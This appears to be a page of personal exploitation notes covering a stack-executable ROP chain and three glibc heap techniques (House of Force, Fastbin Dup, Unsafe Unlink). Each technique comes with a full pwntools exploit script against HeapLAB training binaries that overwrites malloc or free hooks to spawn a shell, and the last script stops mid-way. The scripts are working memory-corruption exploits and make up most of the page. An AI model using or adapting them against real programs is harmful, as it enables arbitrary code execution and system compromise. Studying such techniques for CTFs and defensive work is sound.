I"½”<h1 id="rop">ROP</h1>

<h2 id="ret2stack-making-the-stack-executable">ret2stack: Making the stack executable</h2>
<ol>
  <li>Set value of <code class="language-plaintext highlighter-rouge">__stack_prot</code> to 7</li>
  <li>Call <code class="language-plaintext highlighter-rouge">_dl_make_stack_executable(__libc_stack_end, __stack_prot)</code></li>
  <li>Jump to shellcode</li>
</ol>

<p><strong>Example</strong></p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="n">sh</span><span class="p">())</span>

<span class="n">_dl_make_stack_executable</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'_dl_make_stack_executable'</span><span class="p">]</span>
<span class="n">__stack_prot</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__stack_prot'</span><span class="p">]</span>
<span class="n">__libc_stack_end</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__libc_stack_end'</span><span class="p">]</span>

<span class="n">payload</span> <span class="o">=</span> <span class="s">'A'</span><span class="o">*</span><span class="mi">120</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000410ca3</span><span class="p">)</span> <span class="c1"># pop rsi ; ret
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">__stack_prot</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00000000004163f4</span><span class="p">)</span> <span class="c1"># pop rax ; ret
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x7</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x000000000047ff91</span><span class="p">)</span> <span class="c1"># mov qword ptr [rsi], rax ; ret
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000400696</span><span class="p">)</span> <span class="c1"># pop rdi ; ret
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">__libc_stack_end</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">_dl_make_stack_executable</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000451974</span><span class="p">)</span> <span class="c1"># push rsp ; ret
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">shellcode</span>
</code></pre></div></div>

<h2 id="ret2csu-lack-of-gadgets-in-x64">ret2csu: Lack of gadgets in x64</h2>
<p><a href="https://www.voidsecurity.in/2013/07/some-gadget-sequence-for-x8664-rop.html?m=1">Link</a></p>

<h1 id="heap">Heap</h1>

<h2 id="house-of-force">House of Force</h2>

<p>Exploiting Top Chunk header to gain nearly-arbitrary write primitive.</p>

<p><strong>Requirements</strong></p>
<ul>
  <li>Control of top chunk size, usually through heap overflow</li>
  <li>Full control of size of allocated chunks</li>
</ul>

<p><strong>Arbitrary Write Primitive</strong></p>
<ul>
  <li>Overwrite size of top chunk to <code class="language-plaintext highlighter-rouge">0xffffffffffffffff</code></li>
  <li>Allocate chunk with size of <code class="language-plaintext highlighter-rouge">offset</code>, using <code class="language-plaintext highlighter-rouge">malloc()</code>
    <ul>
      <li>If <code class="language-plaintext highlighter-rouge">target &lt; top_chunk</code>: <code class="language-plaintext highlighter-rouge">offset = top_chunk - target + allocated_chunks_size</code>, and offset is negative</li>
      <li>If <code class="language-plaintext highlighter-rouge">target &gt; top_chunk</code>: <code class="language-plaintext highlighter-rouge">offset = target - top_chunk - allocated_chunks_size</code></li>
    </ul>
  </li>
  <li>Allocate new chunk, this chunk will be created at <code class="language-plaintext highlighter-rouge">target</code></li>
</ul>

<p><strong>Gaining RCE using ret2libc</strong>
<em>This requires libc version to be known</em></p>
<ul>
  <li>Overwrite <code class="language-plaintext highlighter-rouge">__malloc_hook</code> using write primitive with <code class="language-plaintext highlighter-rouge">system()</code></li>
  <li>Call <code class="language-plaintext highlighter-rouge">malloc(/bin/sh)</code></li>
</ul>

<p><strong>Example: HeapLAB House of Force</strong></p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">config</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s">"elf"</span> <span class="p">:</span> <span class="s">"./house_of_force"</span><span class="p">,</span>
    <span class="s">"libc"</span> <span class="p">:</span> <span class="s">"./libc-2.28.so"</span><span class="p">,</span>
    <span class="s">"ld"</span> <span class="p">:</span> <span class="s">"./ld.so.2"</span><span class="p">,</span>
<span class="p">}</span>

<span class="k">def</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">'&gt;'</span><span class="p">,</span> <span class="s">'1'</span><span class="p">)</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">'size:'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">'data:'</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">p</span><span class="p">):</span>
    <span class="c1"># Get addresses
</span>    <span class="n">ru</span><span class="p">(</span><span class="s">'puts() @ '</span><span class="p">)</span>
    <span class="n">puts</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
    <span class="n">ru</span><span class="p">(</span><span class="s">'heap @ '</span><span class="p">)</span>
    <span class="n">heap_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
    
    <span class="c1"># Calculate libc_base, etc...
</span>    <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">puts</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
    <span class="n">malloc_hook</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__malloc_hook'</span><span class="p">]</span>
    <span class="n">system</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
    <span class="n">binsh</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="s">'/bin/sh</span><span class="se">\x00</span><span class="s">'</span><span class="p">).</span><span class="nb">next</span><span class="p">()</span>

    <span class="n">lg</span><span class="p">(</span><span class="s">'heap_addr: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">heap_addr</span><span class="p">))</span>
    <span class="n">lg</span><span class="p">(</span><span class="s">'malloc_hook: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">malloc_hook</span><span class="p">))</span>
    <span class="n">lg</span><span class="p">(</span><span class="s">'system: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
    <span class="n">lg</span><span class="p">(</span><span class="s">'binsh: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">binsh</span><span class="p">))</span>
    
    <span class="c1"># House of Force: Overwrite top_chunk size
</span>    <span class="n">malloc</span><span class="p">(</span><span class="mi">24</span><span class="p">,</span> <span class="s">'/bin/sh</span><span class="se">\x00</span><span class="s">'</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">24</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xffffffffffffffff</span><span class="p">))</span>
    
    <span class="s">"""
    # Overwrite target with "OVERWRIT"
    target = elf.symbols['target']
    top_chunk = heap_addr + 0x20
    offset = top_chunk - target + 32
    ru('&gt;')
    malloc(-offset, p64(0xdeadbeef))
    malloc(16, 'OVERWRIT')
    sla('&gt;', '2')
    """</span>

    <span class="c1"># Pop shell with ret2libc by overwriting __malloc_hook with system() 
</span>    <span class="n">top_chunk</span> <span class="o">=</span> <span class="n">heap_addr</span> <span class="o">+</span> <span class="mh">0x20</span>
    <span class="n">offset</span> <span class="o">=</span> <span class="n">malloc_hook</span> <span class="o">-</span> <span class="n">top_chunk</span> <span class="o">-</span> <span class="mi">32</span>
    <span class="n">ru</span><span class="p">(</span><span class="s">'&gt;'</span><span class="p">)</span>
    <span class="n">malloc</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="s">"Y"</span><span class="p">)</span> 
    <span class="n">malloc</span><span class="p">(</span><span class="mi">24</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">'&gt;'</span><span class="p">,</span> <span class="s">'1'</span><span class="p">)</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">'size:'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">binsh</span><span class="p">))</span>

    <span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">config</span><span class="p">[</span><span class="s">"elf"</span><span class="p">])</span>
    <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">config</span><span class="p">[</span><span class="s">"libc"</span><span class="p">])</span>

    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="n">config</span><span class="p">[</span><span class="s">"ld"</span><span class="p">],</span> <span class="n">config</span><span class="p">[</span><span class="s">"elf"</span><span class="p">]],</span> <span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s">"LD_PRELOAD"</span> <span class="p">:</span> <span class="n">config</span><span class="p">[</span><span class="s">"libc"</span><span class="p">]})</span>
    <span class="n">pause</span><span class="p">()</span>

    <span class="n">sl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
    <span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
    <span class="n">ru</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
    <span class="n">lg</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span> <span class="p">:</span> <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>

    <span class="n">exploit</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
</code></pre></div></div>

<h2 id="fastbin-dupe-tricking-malloc-into-returning-an-already-allocated-heap-pointer-by-abusing-the-fastbin-freelist-to-gain-an-arbitrary-write-primitive">Fastbin Dupe: Tricking malloc into returning an already-allocated heap pointer by abusing the fastbin freelist to gain an arbitrary write primitive.</h2>

<p><strong>Requirements</strong></p>
<ul>
  <li>Allocate chunks in fastbin size, <code class="language-plaintext highlighter-rouge">0x20 - 0x80</code></li>
  <li>Ability to free chunks in any order</li>
  <li>Ability to forge or find fake chunk</li>
</ul>

<p><strong>Arbitrary Write Primitive</strong>
<em>Assuming <code class="language-plaintext highlighter-rouge">target</code> is the address to be overwritten</em></p>
<ul>
  <li>Allocate 2 chunks, free them in alternating order: <code class="language-plaintext highlighter-rouge">free(1), free(0), free(1)</code>. This causes the <code class="language-plaintext highlighter-rouge">fd</code> pointer of the second chunk to link back to the first in the fastbin list.</li>
  <li>Forge a fake chunk somehow at <code class="language-plaintext highlighter-rouge">target - 16</code>, <code class="language-plaintext highlighter-rouge">target - 8</code> must hold chunk size equal to size of previous chunks.</li>
  <li>Allocate chunk, with <code class="language-plaintext highlighter-rouge">target - 16</code> as the data to overwrite the <code class="language-plaintext highlighter-rouge">fd</code> pointer in the fastbin list.</li>
  <li>Allocate 2 more chunks to free up fastbin list. Last address in the fastbin list will point to the fake chunk.</li>
  <li>Allocate chunk with data to be written to <code class="language-plaintext highlighter-rouge">target</code>.</li>
</ul>

<p><strong>Gaining RCE using ret2libc</strong>
<em>This requires libc version to be known</em></p>
<ul>
  <li>Overwrite <code class="language-plaintext highlighter-rouge">__malloc_hook</code> using write primitive with <code class="language-plaintext highlighter-rouge">one_gadget</code>
    <ul>
      <li>Fake chunk can be found using <code class="language-plaintext highlighter-rouge">find_fake_fast &amp;__malloc_hook</code> in <code class="language-plaintext highlighter-rouge">pwndbg</code></li>
      <li>Chunk size of all previous chunks must be same as chunk size in this fake chunk</li>
      <li>As chunk is not allocated with alignment, data when overwriting becomes <code class="language-plaintext highlighter-rouge">padding + one_gadget</code></li>
    </ul>
  </li>
  <li>Call <code class="language-plaintext highlighter-rouge">malloc()</code></li>
</ul>

<p><strong>Example: HeapLAB fastbin_dup</strong></p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">config</span> <span class="o">=</span> <span class="p">{</span><span class="s">"elf"</span> <span class="p">:</span> <span class="s">"./fastbin_dup"</span><span class="p">}</span>

<span class="k">def</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="s">'1'</span><span class="p">)</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">'size: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">'data: '</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="s">'2'</span><span class="p">)</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">'index: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">p</span><span class="p">):</span>
    <span class="c1"># Get puts leak
</span>    <span class="n">ru</span><span class="p">(</span><span class="s">'puts() @ '</span><span class="p">)</span>
    <span class="n">puts</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
    
    <span class="c1"># Setting random username
</span>    <span class="n">sla</span><span class="p">(</span><span class="s">'username: '</span><span class="p">,</span> <span class="s">'JEFFJOHN'</span><span class="p">)</span>
    
    <span class="c1"># Calculate libc addresses
</span>    <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">puts</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
    <span class="n">one_gadget</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0xe1fa1</span>
    <span class="n">malloc_hook</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__malloc_hook'</span><span class="p">]</span>
    
    <span class="c1"># Fastbin dup
</span>    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>

    <span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

    <span class="c1"># Overwrite __malloc_hook with one_gadget 
</span>    <span class="n">fake_chunk</span> <span class="o">=</span> <span class="n">malloc_hook</span> <span class="o">-</span> <span class="mi">35</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_chunk</span><span class="p">))</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">19</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">))</span>

    <span class="c1"># Pop shell
</span>    <span class="n">sla</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="s">'1'</span><span class="p">)</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">'size: '</span><span class="p">,</span> <span class="s">'1'</span><span class="p">)</span>

    <span class="n">lg</span><span class="p">(</span><span class="s">'Fake Chunk: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">fake_chunk</span><span class="p">))</span>
    <span class="n">lg</span><span class="p">(</span><span class="s">'malloc_hook: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">malloc_hook</span><span class="p">))</span>
    <span class="n">lg</span><span class="p">(</span><span class="s">'One_gadget: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">))</span>

    <span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">config</span><span class="p">[</span><span class="s">"elf"</span><span class="p">])</span>
    <span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">libc</span>

    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">)</span>
    <span class="n">pause</span><span class="p">()</span>

    <span class="n">sl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
    <span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
    <span class="n">ru</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
    <span class="n">lg</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span> <span class="p">:</span> <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>

    <span class="n">exploit</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
</code></pre></div></div>

<h2 id="unsafe-unlink-exploiting-free-on-a-corrupted-chunk-to-gain-arbitrary-8-byte-write-anywhere">Unsafe Unlink: Exploiting free on a corrupted chunk to gain arbitrary 8-byte write anywhere.</h2>

<p><strong>Requirements</strong></p>
<ul>
  <li>Allocate chunks in the unsorted bin, <code class="language-plaintext highlighter-rouge">120 - 1000 bytes</code></li>
  <li>Ability to corrupt <code class="language-plaintext highlighter-rouge">prev_size</code> and <code class="language-plaintext highlighter-rouge">prev_in_use</code> flag of a chunk, usually through heap overflow</li>
  <li>Ability to forge a fake freed chunk by writing valid <code class="language-plaintext highlighter-rouge">fd</code> and <code class="language-plaintext highlighter-rouge">bk</code> pointers in a chunkâ€™s data
    <ul>
      <li><code class="language-plaintext highlighter-rouge">fd</code> and <code class="language-plaintext highlighter-rouge">bk</code> must both be writable addresses, such as GOT</li>
    </ul>
  </li>
</ul>

<p><strong>Arbitrary Write Primitive</strong>
<em>Assuming <code class="language-plaintext highlighter-rouge">target</code> is the address to be overwritten</em></p>
<ul>
  <li>Allocate 2 chunks in the unsorted bin</li>
  <li>In the fake free chunk:
    <ul>
      <li><code class="language-plaintext highlighter-rouge">fd (first 8 bytes in chunk data)</code> contains <code class="language-plaintext highlighter-rouge">target</code></li>
      <li><code class="language-plaintext highlighter-rouge">bk (next 8 bytes in chunk data)</code> contains 8-bytes to be written to <code class="language-plaintext highlighter-rouge">target</code></li>
    </ul>
  </li>
  <li>In the corrupted chunk:
    <ul>
      <li>Overwrite <code class="language-plaintext highlighter-rouge">prev_size</code> to be the size of the previous fake free chunk</li>
      <li>Overwite <code class="language-plaintext highlighter-rouge">prev_in_use</code> to be 0, <code class="language-plaintext highlighter-rouge">size</code> of chunk <code class="language-plaintext highlighter-rouge">0x91 -&gt; 0x90</code></li>
    </ul>
  </li>
  <li>Free the corrupted chunk
    <ul>
      <li><code class="language-plaintext highlighter-rouge">bk</code> will contain <code class="language-plaintext highlighter-rouge">fd</code>, vice versa</li>
    </ul>
  </li>
</ul>

<p><strong>Example: HeapLAB unsafe_unlink</strong> <br />
<em>chunk A: fake free chunk, chunk B: corrupted chunk</em><br />
RCE is gained by writing address of chunk Aâ€™s data to <code class="language-plaintext highlighter-rouge">__free_hook</code>, and writing shellcode in chunk Aâ€™s data as <code class="language-plaintext highlighter-rouge">NX</code> is not set.</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">config</span> <span class="o">=</span> <span class="p">{</span><span class="s">"elf"</span> <span class="p">:</span> <span class="s">"./unsafe_unlink"</span><span class="p">}</span>

<span class="k">def</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="s">'1'</span><span class="p">)</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">'size: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="s">'2'</span><span class="p">)</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">'index: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">'data: '</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="s">'3'</span><span class="p">)</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">'index: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">p</span><span class="p">):</span>
    <span class="c1"># Get puts and heap leak
</span>    <span class="n">ru</span><span class="p">(</span><span class="s">'puts() @ '</span><span class="p">)</span>
    <span class="n">puts</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
    <span class="n">ru</span><span class="p">(</span><span class="s">'heap @ '</span><span class="p">)</span>
    <span class="n">heap_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
    
    <span class="c1"># Calculate libc addresses
</span>    <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">puts</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
    <span class="n">free_hook</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__free_hook'</span><span class="p">]</span>

    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x88</span><span class="p">)</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x88</span><span class="p">)</span>
    
    <span class="c1"># In chunk A: Forge fake free chunk by faking fd and bk
</span>    <span class="c1"># In chunk B: Overwrite prev_size and prev_in_use to make the heap think A is freed
</span>    <span class="n">fd</span> <span class="o">=</span> <span class="n">free_hook</span> <span class="o">-</span> <span class="mi">24</span>
    <span class="n">bk</span> <span class="o">=</span> <span class="n">heap_addr</span> <span class="o">+</span> <span class="mh">0x10</span>
    <span class="n">prev_size</span> <span class="o">=</span> <span class="mh">0x90</span>
    <span class="n">size</span> <span class="o">=</span> <span class="mh">0x90</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bk</span><span class="p">)</span> <span class="o">+</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mi">112</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">prev_size</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">size</span><span class="p">)</span>
    <span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>

    <span class="c1"># Free chunk B, heap will try to consolidate A and B with unlinking
</span>    <span class="c1"># Overwrite fd with bk, bk with fd due to unsafe unlinking
</span>    <span class="c1"># __free_hook now points to data of chunk A
</span>    <span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

    <span class="c1"># Write shellcode into data of chunk A
</span>    <span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="n">sh</span><span class="p">())</span>
    <span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">)</span>

    <span class="c1"># Pop shell using free() and __free_hook
</span>    <span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    
    <span class="n">lg</span><span class="p">(</span><span class="s">'heap_addr: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">heap_addr</span><span class="p">))</span>

    <span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">config</span><span class="p">[</span><span class="s">"elf"</span><span class="p">])</span>
    <span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">libc</span>

    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">)</span>
    <span class="n">pause</span><span class="p">()</span>

    <span class="n">sl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
